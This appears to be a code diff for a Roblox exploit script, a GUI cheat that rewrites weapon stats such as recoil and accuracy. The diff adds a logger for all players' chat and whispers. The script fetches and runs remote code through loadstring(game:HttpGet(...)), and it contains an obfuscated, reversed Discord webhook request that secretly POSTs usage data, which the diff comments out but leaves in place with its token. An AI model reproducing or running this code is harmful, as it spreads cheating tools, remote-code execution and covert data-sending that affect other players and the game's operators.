@@ -1,5 +1,7 @@
 local service, essentials, styles, functions = loadstring(game:HttpGet("https://raw.githubusercontent.com/compressor/scripts/main/guiframework"))()
 
+service["chat"] = game:GetService("Chat")
+
 functions.connect.drag = function(guitomove, guiinput, speed, smoothbool)
             
         guiinput.InputBegan:Connect(function(inp)
@@ -85,27 +87,31 @@ local creatormessages =
     '<b>fortnite move</b>',
     'https://cdn.discordapp.com/attachments/675605826299232287/827962678881681408/Tylayt.webm',
     'https://youtu.be/1hHB9zC_9Yc',
-    '<font color="rgb(170, 141, 216)">say you are my baka</font> 😈'
+    '<font color="rgb(170, 141, 216)">say you are my baka</font> 😈',
+    'kaiiiryu!',
+    '$LATT GANG',
 }
 
 local greetingmessages =
 {
-    "welcome,",
-    "hvh unite,",
-    "ja",
-    "<i>ohayo,</i>",
-    "<s>uwu</s>",
-    "sup,",
-    "здравия,",
-    "-",
-    "nil,",
-    "🥀",
+    " welcome, ",
+    " hvh unite, ",
+    " ja ",
+    " <i>ohayo,</i> ",
+    " <s>uwu</s> ",
+    " sup, ",
+    " здравия, ",
+    " - ",
+    " nil, ",
+    " 🥀 ",
 }
 
 local statvalues = {"Accuracy", "Recoil", "Spread", "FireRate", "ReloadTime", "Amount", "AimSpeed", "SlowDown", "FieldOfViewS", "Dropoff", "FlinchTime", "WalkSpreadIncrease", "DownedDiv", "EquipTime", "DebonceTime", "StaminaUsage", "SwingTime", "SwingWait"}
 
 local tiles = {}
 local customtiles = {}
+
+local connectedevents = {}
 
 local gui = functions.createnew.screen(true)
 
@@ -117,13 +123,12 @@ local topbarbg = styles.internal1.bg(topbar, -15, Color3.fromRGB(50, 52, 50), UD
 local topbarcolor = Color3.fromHSV(math.random(0, 255)/255, 0.7, 1)
 local draggabletip = styles.internal1.text(topbar, -14, "(hold lmb = drag window)", "Gotham", topbarcolor, Color3.new(), Vector2.new(0.5, 0), UDim2.new(0.5, 0, -0.25, -2), UDim2.new(1, 0, 0.25, 0), "Left", "Center")
 local scantip = styles.internal1.text(topbar, -14, "(a = apply values | may lag for a bit)", "Gotham", topbarcolor, Color3.new(), Vector2.new(0.5, 0), UDim2.new(0.5, 0, -0.25, -2), UDim2.new(1, 0, 0.25, 0), "Right", "Center")
-local topbarwelcome = styles.internal1.text(topbar, -14, "<b>|</b> " .. greetingmessages[math.random(1, #greetingmessages)] .. " <b>" .. service.plr.Name .. "</b>", "Gotham", topbarcolor, Color3.new(), Vector2.new(0, 0), UDim2.new(0, 2, 0, 2), UDim2.new(0.5, -4, 0.7, -4), "Left", "Center")
+local topbarwelcome = styles.internal1.text(topbar, -14, "<b>|</b>" .. greetingmessages[math.random(1, #greetingmessages)] .. "<b>" .. service.plr.Name .. "</b>", "Gotham", topbarcolor, Color3.new(), Vector2.new(0, 0), UDim2.new(0, 2, 0, 2), UDim2.new(0.5, -4, 0.7, -4), "Left", "Center")
 local topbarname = styles.internal1.text(topbar, -14, creatormessages[math.random(1, #creatormessages)], "Gotham", topbarcolor, Color3.new(), Vector2.new(0, 1), UDim2.new(0, 2, 1, -2), UDim2.new(0.5, -4, 0.4, -4), "Left", "Center")
 
 local closebutton = functions.createnew.frame(topbar, 16, false, Vector2.new(1, 0.5), UDim2.new(1, -6, 0.5, 0), UDim2.new(0, 28, 0, 28))
 local closebg = styles.internal1.bg(closebutton, -14, Color3.fromRGB(70, 72, 70), UDim2.new(1, 0, 1, 0))
-local closetext = styles.internal1.text(closebutton, -13, "+", "GothamBold", topbarcolor, Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -4, 1, -4), "Center", "Center")
-closetext.TextColor3 = Color3.fromRGB(255-topbarcolor.R*255+50, 255-topbarcolor.G*255+50, 255-topbarcolor.B*255+50)
+local closetext = styles.internal1.text(closebutton, -13, "+", "GothamBold", Color3.fromRGB(255-topbarcolor.R*255+50, 255-topbarcolor.G*255+50, 255-topbarcolor.B*255+50), Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -4, 1, -4), "Center", "Center")
 closetext.Rotation = 45
 
 local hidebutton = functions.createnew.frame(topbar, 16, false, Vector2.new(1, 0.5), UDim2.new(1, -40, 0.5, 0), UDim2.new(0, 28, 0, 28))
@@ -150,6 +155,216 @@ local scrollerclip = functions.createnew.frame(container, 1, true, Vector2.new(0
 local scrollerbg = styles.internal1.bg(scrollerclip, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, 0, 1, 0))
 local scroller, scrollersort = functions.createnew.scroll(scrollerclip, 7, false, Vector2.new(0, 0.5), UDim2.new(0, 2, 0.5, 0), UDim2.new(1, -6, 1, -6), UDim2.new(1, 0, 3, 0))
 scrollersort.HorizontalAlignment = "Left"
+
+--preset shit
+
+local presetcontainer = functions.createnew.frame(newmain, 2, true, Vector2.new(0.5, 0), UDim2.new(0.5, 0, 0, 340), UDim2.new(1, 0, 0, 300))
+local presetcontainerbg = styles.internal1.bg(presetcontainer, -15, Color3.fromRGB(50, 52, 50), UDim2.new(1, -2, 1, -2))
+
+local presetscrollerclip = functions.createnew.frame(presetcontainer, 1, true, Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -12, 1, -12))
+local presetscrollerbg = styles.internal1.bg(presetscrollerclip, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, 0, 1, 0))
+local presetscroller, presetscrollersort = functions.createnew.scroll(presetscrollerclip, 7, false, Vector2.new(0, 0.5), UDim2.new(0, 2, 0.5, 0), UDim2.new(1, -6, 1, -6), UDim2.new(1, 0, 3, 0))
+presetscrollersort.HorizontalAlignment = "Left"
+
+--chat logger
+
+local chatlogcontainer = functions.createnew.frame(presetscroller, 4, false, Vector2.new(0, 0.5), UDim2.new(0, 0, 0.5, 0), UDim2.new(1, -4, 0, 36))
+local chatlogcontainerbg = styles.internal1.bg(chatlogcontainer, -14, Color3.fromRGB(70, 72, 70), UDim2.new(1, -4, 1, -4))
+
+local chatlognamecontainer = functions.createnew.frame(chatlogcontainer, 5, false, Vector2.new(0, 0.5), UDim2.new(0, 4, 0.5, 0), UDim2.new(1, -8, 1, 0))
+local chatlogtextbg = styles.internal1.bg(chatlognamecontainer, -13, Color3.fromRGB(60, 62, 60), UDim2.new(1, -4, 1, -10))
+local chatlogtext = styles.internal1.text(chatlognamecontainer, 6, "<b>Chat logger</b>", "Gotham", Color3.fromRGB(255, 255, 255), Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -6, 1, -6), "Center", "Center")
+
+--chat logger connecting and shit
+
+functions.connect.click(chatlogtext, function()
+    
+    local chatloggerevents = {}
+    table.insert(connectedevents, chatloggerevents)
+    
+    local messages = {}
+    local rawmessages = {}
+    
+    local chatloggermain = functions.createnew.frame(gui, 0, true, Vector2.new(1, 1), UDim2.new(1, -2, 1, -2), UDim2.new(0, 240, 0, 0))
+    
+    service.tween:Create(chatloggermain, TweenInfo.new(0.6, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 240, 0, 300)}):Play()
+    
+    local chatloggertopbar = functions.createnew.frame(chatloggermain, 15, false, Vector2.new(0.5, 0), UDim2.new(0.5, 0, 0, 0), UDim2.new(1, 0, 0, 20))
+    local chatloggertopbarbg = styles.internal1.bg(chatloggertopbar, -15, Color3.fromRGB(50, 52, 50), UDim2.new(1, -2, 1, -2))
+    local chatlogtext = styles.internal1.text(chatloggertopbar, 6, "Chat logger", "Gotham", topbarcolor, Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -6, 1, -6), "Left", "Center")
+    
+    local closechatloggercontainer = functions.createnew.frame(chatloggertopbar, 16, true, Vector2.new(1, 0.5), UDim2.new(1, -2, 0.5, 0), UDim2.new(0, 16, 0, 16))
+    local closechatloggerbg = styles.internal1.bg(closechatloggercontainer, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, -4, 1, -4))
+    local closechatloggertext = styles.internal1.text(closechatloggercontainer, 6, "+", "GothamBold", Color3.fromRGB(255-topbarcolor.R*255+50, 255-topbarcolor.G*255+50, 255-topbarcolor.B*255+50), Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -2, 1, -2), "Center", "Center")
+    closechatloggertext.Rotation = 45
+    
+    local chatloggermsgnumcontainer = functions.createnew.frame(chatloggertopbar, 16, true, Vector2.new(1, 0.5), UDim2.new(1, -18, 0.5, 0), UDim2.new(0, 32, 0, 16))
+    local chatloggermsgnumbg = styles.internal1.bg(chatloggermsgnumcontainer, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, -4, 1, -4))
+    local chatloggermsgnumtext = styles.internal1.textbox(chatloggermsgnumcontainer, 6, "50", "GothamBold", topbarcolor, Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -2, 1, -2), "Center", "Center")
+    
+    local copychatlogscontainer = functions.createnew.frame(chatloggertopbar, 16, true, Vector2.new(1, 0.5), UDim2.new(1, -50, 0.5, 0), UDim2.new(0, 40, 0, 16))
+    local copychatlogsbg = styles.internal1.bg(copychatlogscontainer, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, -4, 1, -4))
+    local copychatlogstexet = styles.internal1.text(copychatlogscontainer, 6, "COPY", "GothamBold", topbarcolor, Color3.new(), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -2, 1, -2), "Center", "Center")
+    
+    functions.connect.textinput.lost(chatloggermsgnumtext, "why do i have to parse this", function(enterpressed)
+        local chatlognum = tonumber(chatloggermsgnumtext.Text)
+        
+        if not enterpressed or not (chatlognum and chatlognum > 1) then
+            chatloggermsgnumtext.Text = "50"
+        end
+    end)
+    
+    functions.connect.click(copychatlogscontainer, function()
+        local formatted = ""
+        
+        for i, msg in pairs(rawmessages) do
+            formatted = msg .. "\n" .. formatted
+        end
+        
+        formatted = string.format(formatted)
+        
+        syn.write_clipboard(formatted)
+    end)
+    
+    functions.connect.click(closechatloggercontainer, function()
+        for i, event in pairs(chatloggerevents) do
+            event = nil
+        end
+        
+        chatloggerevents = nil
+        
+        local closetween = service.tween:Create(chatloggermain, TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 240, 0, 0) } )
+        closetween:Play()
+        closetween.Completed:Wait()
+        
+        chatloggermain:Destroy()
+        messages = nil
+    end)
+    
+    local chatloggercontainer = functions.createnew.frame(chatloggermain, 15, false, Vector2.new(0.5, 1), UDim2.new(0.5, 0, 1, 0), UDim2.new(1, 0, 1, -20))
+    local chatloggercontainerbg = styles.internal1.bg(chatloggercontainer, -15, Color3.fromRGB(50, 52, 50), UDim2.new(1, -2, 1, -2))
+    
+    functions.connect.drag(chatloggermain, chatloggertopbar, 0.65, true)
+    functions.connect.drag(chatloggermain, chatloggercontainer, 0.65, true)
+    
+    local messagecontainer = functions.createnew.frame(chatloggercontainer, 16, true, Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0), UDim2.new(1, -8, 1, -8))
+    local messagecontainerbg = styles.internal1.bg(messagecontainer, -14, Color3.fromRGB(60, 62, 60), UDim2.new(1, -2, 1, -2))
+    
+    local chatloggerscroller, chatloggerscrollersort = functions.createnew.scroll(messagecontainer, 7, false, Vector2.new(0, 0.5), UDim2.new(0, 2, 0.5, 0), UDim2.new(1, -6, 1, -6), UDim2.new(1, 0, 0, 0))
+    chatloggerscrollersort.HorizontalAlignment = "Left"
+    chatloggerscrollersort.VerticalAlignment = "Bottom"
+    
+    chatloggerscroller.ScrollBarImageColor3 = topbarcolor
+    chatloggerscroller.ScrollBarThickness = 0
+    functions.connect.guienter(messagecontainer, function()
+        service.tween:Create(chatloggerscroller, TweenInfo.new(0.15, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { ScrollBarThickness = 6 }):Play()
+    end)
+    functions.connect.guileave(messagecontainer, function()
+        service.tween:Create(chatloggerscroller, TweenInfo.new(0.15, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { ScrollBarThickness = 0 }):Play()
+    end)
+    
+    local function createchattedbar(msg)
+        if #messages >= tonumber(chatloggermsgnumtext.Text) then
+            for i = 0, #messages - chatloggermsgnumtext.Text do
+                --print(messages[i][3].Text)
+                
+                for i, child in pairs(messages[#messages - i]) do
+                    child:Destroy()
+                end
+                
+                table.remove(messages, #messages - i)
+                table.remove(rawmessages, #messages - i)
+            end
+        end
+        
+        local chattime = os.time()
+        
+        local newmsgbar = functions.createnew.frame(chatloggerscroller, 16, false, Vector2.new(0.5, 0), UDim2.new(0.5, 0, 0, 0), UDim2.new(1, 0, 0, 0))
+        local msgtextclipper = functions.createnew.frame(newmsgbar, 16, true, Vector2.new(0.5, 1), UDim2.new(0.5, 0, 1, 0), UDim2.new(1, 0, 0, 0))
+        local chatlogtext = styles.internal1.text(msgtextclipper, 6, '<font color="rgb(150, 150, 150)">[' .. string.format("%02i:%02i:%02i", chattime/3600%24, chattime/60%60, chattime%60) .. ']</font>' .. msg, "Gotham", Color3.fromRGB(255, 255, 255), Color3.new(), Vector2.new(0.5, 1), UDim2.new(0.5, 0, 1, 0), UDim2.new(1, -6, 1, -6), "Left", "Center")
+        chatlogtext.TextScaled = false
+        chatlogtext.TextSize = 12
+        
+        newmsgbar.Size = UDim2.new(newmsgbar.Size.X.Scale, newmsgbar.Size.X.Offset, newmsgbar.Size.Y.Scale, chatlogtext.TextBounds.Y)
+        newmsgbar.Position = UDim2.new(newmsgbar.Position.X.Scale, newmsgbar.Position.X.Offset, newmsgbar.Position.Y.Scale, chatlogtext.TextBounds.Y/2)
+        
+        local calculatedsize = 0
+        for i, message in pairs(messages) do
+            calculatedsize = calculatedsize + message[1].Size.Y.Offset
+        end
+        
+        local textformula = calculatedsize + chatlogtext.TextBounds.Y + 6
+        
+        chatloggerscroller.CanvasSize = UDim2.new(chatloggerscroller.CanvasSize.X.Scale, chatloggerscroller.CanvasSize.X.Offset, chatloggerscroller.CanvasSize.Y.Scale, textformula)
+        
+        if chatloggerscroller.CanvasPosition.Y + messagecontainer.AbsoluteSize.Y >= calculatedsize - 60 then
+            service.tween:Create(chatloggerscroller, TweenInfo.new(1.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(0, textformula) } ):Play()
+        end
+        
+        service.tween:Create(msgtextclipper, TweenInfo.new(1, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, chatlogtext.TextBounds.Y + 6) } ):Play()
+        
+        table.insert(messages, 1, {newmsgbar, msgtextclipper, chatlogtext})
+    end
+    
+    for i, otherplr in pairs(service.plrs:GetPlayers()) do
+        local plrcolor = Color3.fromHSV(math.random(0, 255)/255, 0.7, 1)
+        
+        local newchatevent = otherplr.Chatted:Connect(function(msg)
+            
+            table.insert(rawmessages, 1, "[" .. string.format("%02i:%02i:%02i", os.time()/3600%24, os.time()/60%60, os.time()%60) .. "] [" .. otherplr.Name .. "]: " .. msg)
+            
+            if string.find(msg, "/w ") then
+                local parts = string.split(msg, " ")
+                
+                if parts[2] ~= otherplr.Name and service.plrs:FindFirstChild(parts[2]) then
+                    createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> <font color="rgb(0, 255, 255)"><b>[WHISPER TO ' .. parts[2] .. ']</b> ' .. string.split(msg, parts[1] .. " " .. parts[2])[2] .. "</font>")
+                else
+                    createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> ' .. msg)
+                end
+                
+            elseif string.find(msg, "/e ") then
+                local parts = string.split(msg, " ")
+                createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> <font color="rgb(165, 165, 167)"><b>[EMOTE]</b>' .. string.split(msg, parts[1])[2] .. "</font>")
+            else
+                createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> ' .. msg)
+            end
+        end)
+        
+        table.insert(chatloggerevents, newchatevent)
+    end
+    
+    service.plrs.PlayerAdded:Connect(function(otherplr)
+        local plrcolor = Color3.fromHSV(math.random(0, 255)/255, 0.7, 1)
+        
+        createchattedbar(' <font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')"><b>' .. otherplr.Name .. '</b> just joined the game!</font>')
+        
+        local newchatevent = otherplr.Chatted:Connect(function(msg)
+            
+            table.insert(rawmessages, 1, "[" .. string.format("%02i:%02i:%02i", os.time()/3600%24, os.time()/60%60, os.time()%60) .. "] [" .. otherplr.Name .. "]: " .. msg)
+            
+            if string.find(msg, "/w ") then
+                local parts = string.split(msg, " ")
+                
+                if parts[2] ~= otherplr.Name and service.plrs:FindFirstChild(parts[2]) then
+                    createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> <font color="rgb(0, 255, 255)"><b>[WHISPER TO ' .. parts[2] .. ']</b> ' .. string.split(msg, parts[1] .. " " .. parts[2])[2] .. "</font>")
+                else
+                    createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> ' .. msg)
+                end
+                
+            elseif string.find(msg, "/e ") then
+                local parts = string.split(msg, " ")
+                createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> <font color="rgb(165, 165, 167)"><b>[EMOTE]</b>' .. string.split(msg, parts[1])[2] .. "</font>")
+            else
+                createchattedbar(' <b><font color="rgb(' .. math.floor(plrcolor.R*255) .. ", " .. math.floor(plrcolor.G*255) .. ", " .. math.floor(plrcolor.B*255) .. ')">[' .. otherplr.Name .. ']:</font></b> ' .. msg)
+            end
+        end)
+        
+        table.insert(chatloggerevents, newchatevent)
+    end)
+    
+end)
+
+--function
 
 local somerandomnumber = math.random(0, 100)/100
 
@@ -244,6 +459,7 @@ local function mathops(operator, a, b)
     end
 end
 
+--[[
 local postdata = 
 {
     ["username"] = "value changer";
@@ -251,6 +467,7 @@ local postdata =
 }
 
 syn.request( { Url = string.reverse("NvO5T38hSB06IkfTGvpfXaNvBMEaPMZ8V95j8uTFNe3efeGrMUJPv7wN87y6UChNHZ-k/611479588625182728/skoohbew/ipa/moc.drocsid//:sptth"), Headers = { ["Content-Type"] = "application/json" }, Method = "POST", Body = service.http:JSONEncode(postdata) } )
+]]
 
 local function applyvalues(statname, newvalue)
     
@@ -398,6 +615,15 @@ functions.connect.guileave(container, function()
     service.tween:Create(scroller, TweenInfo.new(0.15, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { ScrollBarThickness = 0 }):Play()
 end)
 
+presetscroller.ScrollBarImageColor3 = topbarcolor
+presetscroller.ScrollBarThickness = 0
+functions.connect.guienter(presetcontainer, function()
+    service.tween:Create(presetscroller, TweenInfo.new(0.15, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { ScrollBarThickness = 6 }):Play()
+end)
+functions.connect.guileave(presetcontainer, function()
+    service.tween:Create(presetscroller, TweenInfo.new(0.15, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { ScrollBarThickness = 0 }):Play()
+end)
+
 local applyingvalues = false
 functions.connect.click(scancontainer, function()
     if not applying then
@@ -436,7 +662,7 @@ functions.connect.click(hidebutton, function()
     else
         hidetext.Text = "-"
         
-        local opentween = service.tween:Create(newmain, TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 500, 0, 348) })
+        local opentween = service.tween:Create(newmain, TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 500, 0, 640) })
         opentween:Play()
         opentween.Completed:Wait()
         
@@ -541,6 +767,19 @@ functions.connect.click(closebutton, function()
         tiles = nil
         creatormessages = nil
         
+        for i, connectedevent in pairs(connectedevents) do
+            if typeof(connectedevents) == 'table' then
+                for x, a in pairs(connectedevent) do
+                    a = nil
+                end
+                connectedevent = nil
+            else
+                connectedevent = nil
+            end
+        end
+        
+        connectedevents = nil
+        
         closetext.Rotation = 180
         service.tween:Create(closetext, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Rotation = 45 }):Play()
         
@@ -551,14 +790,14 @@ functions.connect.click(closebutton, function()
         closingtween.Completed:Wait()
         
         gui:Destroy()
-    
+        
     end
     
 end)
 
 wait()
 
-local mainopening = service.tween:Create(newmain, TweenInfo.new(0.6, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 500, 0, 348)})
+local mainopening = service.tween:Create(newmain, TweenInfo.new(0.6, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), { Size = UDim2.new(0, 500, 0, 640)})
 mainopening:Play()
 mainopening.Completed:Wait()
 newmain.ClipsDescendants = false
